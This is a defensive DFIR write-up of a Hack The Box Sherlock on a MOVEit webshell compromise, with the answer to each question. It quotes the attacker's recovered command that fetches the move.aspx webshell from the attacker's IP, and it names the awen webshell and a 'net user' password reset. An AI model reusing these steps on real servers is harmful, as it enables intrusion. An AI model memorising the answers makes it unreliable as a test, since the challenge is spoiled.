# **i-like-to Writeup**
![image](https://github.com/user-attachments/assets/7e3e7ff5-17c3-4b1d-a946-1df94e98db0b)

We have unfortunately been hiding under a rock and do not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker & retrieve some details, so we can implement them into our SOC environment. We have provided you with a triage of all the necessary artefacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here...

**Tool:**
- Windows Event Viewer
- Volatility3
- MFTExplorer
- MFTECmd
- Timeline Explorer
- EVTXeCmd

**Learned:**
- Initial Analysis Importance!
- Web Shell Analysis
- Account Compromise
- PC Compromise

### **Question 1**
Name of the ASPX webshell uploaded by the attacker?

First, lets understand the MOVEit CVE... CVE-2023-34362 was a sql injection to a remote code execution in the MOVEit web app. So MOVEit is a web application. This SQL injection gave access to the database but could allow you to do remote code execution. Something I have learned is for this older CVE there is usually a POC and understand that has beenr esourceful. Here is wwhere I readup on a POC: [MOVEit Transfer CVE-2023-34362 Deep Dive and Indicators of Compromise: Horizon3.ai](https://www.horizon3.ai/attack-research/attack-blogs/moveit-transfer-cve-2023-34362-deep-dive-and-indicators-of-compromise/)
	
Initial analysis we are given a virtual memory dump, and a KAPE image. I will load up the $MFT in the background to have it ready. I noticed with the vmem file we do not have the .vmss file we will not be able to use volatility3 on it since that is needed to the analysis because it is a snapshot of the machine state. Digging through the KAPE image I can see the artifacts for the OS ar ehere, event logs, IIS logs, and other details about machine are here. We are wanting to identify the webshell and since I found the IIS logs I will start there. IIS logs out any diganostic information to monitoring traffic via GET/POST to how the web app is performing. These are great as to how it logs out it will log out the date/time, Client IP, User agent, Status code, Protocol, server IP/PORT, URI query, Bytes Sent/Received etc. I am wondering what the logs look like.
	
I did do a bit of strings on the .vmem but I yielded nothing and I checked the powershell logs and didn't see anything as well! Here is the file location of the IIS logs in the KAPE image: \i_like_to DFIR\Triage\uploads\auto\C%3A\inetpub\logs\LogFiles\W3SVC2\u_ex230712.txt

I am analyzing this inside of Notepad++ and searched for .aspx and got a few hits! I see communication between the server IP and a range. I see various IP's and I did notice some traffic that was using port 80 which is insecure but I didn't see a malicious POST request... all seemed like regular traffic. I did see where this IP: 10.255.254.3 was using nmap as I saw that user agent... I suspect this might be the TA doing some recon.
	
Doing a search on '.aspx' I see various web shells.... machine.aspx, human.aspx, machine2.aspx, guestaccess.aspx, and move.aspx. One thing I noticed is its the same IP: 10.255.254.3... I will have to do more research on these to prove which one is the malicious one. Referring back to MFTExplorer my $MFT has finished uploading. I am not seeing anything glaring but I am going to condense this into a .csv using 'MFTECmd.exe'. Then upload it into 'Timeline.exe' to help me with analyzing this $MFT and I can search for those web shells to see if it existed anywhere within the files. Under the '\MOVEitTransfer\wwwroot' folder I can see the move.aspx webshell

![image](https://github.com/user-attachments/assets/9e6d314c-3e09-46fb-adf7-a3124363d482)

Weird, when I look at the folder in MFTExplorer I see a moveit.asp... and a moveit.aspx. Both the same size as if it was renamed? I went back to the Timeline Explorer and searched for 'moveit.asp' and I noticed in the '\inetpub\wwwroot' which is where IIS directory is I can see the file in there

![image](https://github.com/user-attachments/assets/99783701-c150-4a78-be27-bc2cc143d8a0)

When I analyze the moveit.asp file under the '\inetpub\wwwroot' and \MOVEitTransfer\wwwroot'I can see the file was created on 7/12/2023 @ 11:17 under the inet directory and under the wwwroot directory it was 11:19 where I am lead to believe the file was moved to the IIS directory.

![image](https://github.com/user-attachments/assets/3e70dff8-aa93-4479-be96-eb80f224a05e)

Then I found the webshell move.aspx in the wwwroot directory had been created at 11:24. I think the TA moved the file to the IIS directory, renamed it to 'move.aspx' which is a web shell file.

![image](https://github.com/user-attachments/assets/70339366-d973-48b4-b93d-47dec64926da)

Going back to the IIS logs I can see the move.aspx file was referenced at the end at 11:24 leading me to believe this is the initial web shell the attacker leveraged. Which that is the correct answer

![image](https://github.com/user-attachments/assets/cfb5a971-6fc4-40fe-8e9a-0fcc8a751764)

**Answer:** move.aspx

### **Question 2**
What was the attacker's IP address?

In the IIS logs, it logged out the TA IP: 10.255.254.3

**Answer:** 10.255.254.3

### **Question 3**
What user agent was used to perform the initial attack?

During my initial analysis I discovered all this in the IIS logs. The initial agent was ruby

![image](https://github.com/user-attachments/assets/5cdb6206-881b-484e-9f08-b5ded148493f)

**Answer:** Ruby

### **Question 4**
When was the ASPX webshell uploaded by the attacker?

I believe this is asking when it was uploaded to the directory and in the IIS logs I can see when the TA called it.

![image](https://github.com/user-attachments/assets/03336f1e-66db-4d88-b619-320a78d82bd1)

**Answer:** 12/07/2023 11:24:30

### **Question 5**
The attacker uploaded an ASP webshell which didn't work, what is its filesize in bytes?

This is referncing the original file which was the 'moveit.asp'. In Timeline Explorer it shows the file size which is 1362 bytes

![image](https://github.com/user-attachments/assets/69205bca-67e9-4f5f-ab95-df6bfb2568c2)

**Answer:** 1362

### **Question 7**
Which tool did the attacker use to initially enumerate the vulnerable server?

In my initial analysis using the IIS logs I noticed a user agent of nmap which I suspected the TA was enumerating our network.

![image](https://github.com/user-attachments/assets/2c4c3e79-46e0-43cb-99db-93da2154002f)

**Answer:** nmap
### **Question 8**
We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC)

Remember we have a KAPE image and I identified earlier we have event logs. I suspect in the security logs this event was logged out. Here is the folder path for the event logs: i_like_to DFIR\Triage\uploads\auto\C%3A\Windows\System32\winevt\Logs

In the security logs, I did research on the event ID of when a password change was made/requested and event ID 4724 indicates that an administrator has requested to change the password. So, it appears the TA has access to a admin account and requested for the 'moveitsvc' service account to be changed. Shortly after I saw a logon success but it was the time of the event was the exact same for when the password changed so within the same timeframe the TA changed the password and then logged into the SVC

![image](https://github.com/user-attachments/assets/ec47c3bb-2f1f-4482-b006-bed83e550876)

**Answer:** 12/07/2023 11:09:27
### **Question 9**
Which protocol did the attacker utilize to remote into the compromised machine?

To help identify how the user got onto the remote machine I will need to do some timeline analysis and lineup the event logs. Since I know the password change occured for the service account on 7/12/2023 11:09:27 but I will want to see when the attacker logged into the admin account in the security logs. Getting that time frame will help me line up the events across all the logs.

I will filter on event ID 4624 and will look for logon type of 3 which inidicates the logon type was over a network. I used this custom query that I built to filter on event ID 4624 and logon type 

  <QueryList>
	  <Query Id="0" Path="Security">
	    <Select Path="Security">
	      *[System[(EventID=4624)]]
	      and
	      *[EventData[Data[@Name='LogonType'] and (Data='3')]]
	    </Select>
	  </Query>
	</QueryList>

We can see the TA logging into the service account where they changed the password over the network. My initial thought is they might've used RDP but i need to look further. Also, I want to note that this event of them logging onto this account happened 2 minutes happened after the password got changed.

![image](https://github.com/user-attachments/assets/8d0e1c6e-484c-4bc8-b045-e75a3cfb3aa0)
	
To help line up the timeline I am going to condense all the windows event logs using 'EVTXeCmd' which will parse through all the logs and compile them into a csv allowing me to then use Timeline explorer to search through them more quickly allowing me align up events more to track down the protocol used. Still having a hard time I will go back to the security log and do further research on event ID 4624. Through further esearch about the logon type field. I learned about logon type 10 which is a remote interactive logon. This idetifies that a user used RDP to login. Here in the picture below you will see the TA logged into the machine using the svc account using rdp. Here is the filter I built:

  <QueryList>
	  <Query Id="0" Path="Security">
	    <Select Path="Security">
	      *[System[(EventID=4624)]]
	      and
	      *[EventData[Data[@Name='LogonType'] and (Data='10')]]
	    </Select>
	  </Query>
	</QueryList>

![image](https://github.com/user-attachments/assets/035edde8-2fc9-469c-a312-695f258d7534)

**Answer:** rdp
### **Question 10**
Please confirm the date and time the attacker remotely accessed the compromised machine?

In the log where we identified the user logged in over RDP open up the details to see when the event occured

![image](https://github.com/user-attachments/assets/f1d3420c-1ecb-4a65-a108-07c7eac4f4f5)

**Answer:** 12/07/2023 11:11:18
### **Question 11**
What was the useragent that the attacker used to access the webshell?

Going back to the IIS logs we can see the user agent

![image](https://github.com/user-attachments/assets/4a90ab02-aa24-4a9c-954e-c35a63df0d97)

**Answer:** Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0
### **Question 12**
What is the inst ID of the attacker?

I am not sure what this is referncing so I will refernce something else. Ahhh, I see this is the instance ID which can be found in the SQL database. Which I noticed when I tried running the 'moveit.sql' it wouldn't compile it would error. I am going to see if I can string this information out of it. I did a: grep "IntID" moveit.sql and a few results came back especially around the users table. I am going to open it in a text editor for further analysis. I saw the field 'IntID' being built under the log part. At this point I am stuck and will look at someone else writeup.

Utilziing this persons writeup they wrote a advanced way of gather the IntID which I tried in my insance and I found ([HTB Sherlock: i-like-to | 0xdf hacks stuff](https://0xdf.gitlab.io/2023/11/17/htb-sherlock-i-like-to.html#instid)). I will continue my own analysis from here. Looking at the results its the log file results. I see what appears to be yser names ranging from anonymous, vcjoaquq, Guest:*******. With the repitive Guest entries and how they are formated they look like they are using randomization in letter as if a program is doing that. Looking at those closer I can see this is the compromised machine and looking at the timestamp this is after the TA got a foothold on the system. This is the InstID of the attacker: 1234

![image](https://github.com/user-attachments/assets/8d7b669e-07b6-491c-9649-25cf0b0459f0)

**Answer:** 1234
### **Question 13**
What command was run by the attacker to retrieve the webshell?

Since this is asking about a command I am going to look at the powershell commands. I will open up my Timeline explorer of them and search for 'wget'. It is encoded and I wasn't able to determine the encoding. I will go back to the $MFT in MFTExplorer and I will see if there are pwoershell logs. Doinga  google search I was able to identify the folder here: .\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

The logs had a command of 'netstat'.... Let me see if I can identify in other accounts PowerShell logs. In the moveitsvc account there is powershell logs: .\Users\moveitsvc.WIN-LR8T2EF8VHM.002\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

Found the command the TA ran to pull down the web shell

![image](https://github.com/user-attachments/assets/8e8c30fe-6ad5-40fb-bd88-87178fdd258d)

**Answer:** wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx
### **Question 14**
What was the string within the title header of the webshell deployed by the TA?

To help find the title header of the webshell that was deployed I will string the memory. I am not sure the KAPE artifacts will be of use here. I am wondering if in the system memory of what the thing was that deployed the webshell was captured

My initial search I searched for: strings I-like-to-27a787c5.vmem | grep "move.aspx". Which I saw this form name field and made me wonder if I could find the title field by doing a grep on <title>... that did not yield results I expected... let me go back and try searching by that form but I will tell my grep search to show me a few lines after it found a matching string. Here is the command I built out to help me find the title:

![image](https://github.com/user-attachments/assets/08caba26-f0d4-4b69-bfdf-e8bde207e951)

I have the output here and can see this is using a program of some sorts but I was not able to find the title field. I see the encoding and I will put it together.... I found that it links out to a hithub repo: [WebShell-2/Aspx/awen asp.net webshell.aspx at master · SecWiki/WebShell-2 (github.com)](https://github.com/SecWiki/WebShell-2/blob/master/Aspx/awen%20asp.net%20webshell.aspx)

In the repo you can see the name: awen asp.net webshell

![image](https://github.com/user-attachments/assets/e4fa951c-2a00-47b5-bed5-7ab4d549afc3)

**Answer:** awen asp.net webshell
### **Question 16**
What did the TA change the our moveitsvc account password to?

Doing some research I found that you can do a net user username password which allows for you to change someones account password. I am going to see if I can grep this information out. Found it! I learned something new I was not aware of this 'net stat'. Here is my command I ran: strings I-like-to-27a787c5.vmem | grep "net user"

![image](https://github.com/user-attachments/assets/f33f02a0-243c-4816-89ce-0a8852079358)

**Answer:** 5trongP4ssw0rd

This was challenging! Not having all the artifacts to do memory analysis required to go old school in the method of using strings and grep together to pull info out. Along the way I learned a few new things which is the purpose of these challeneges!
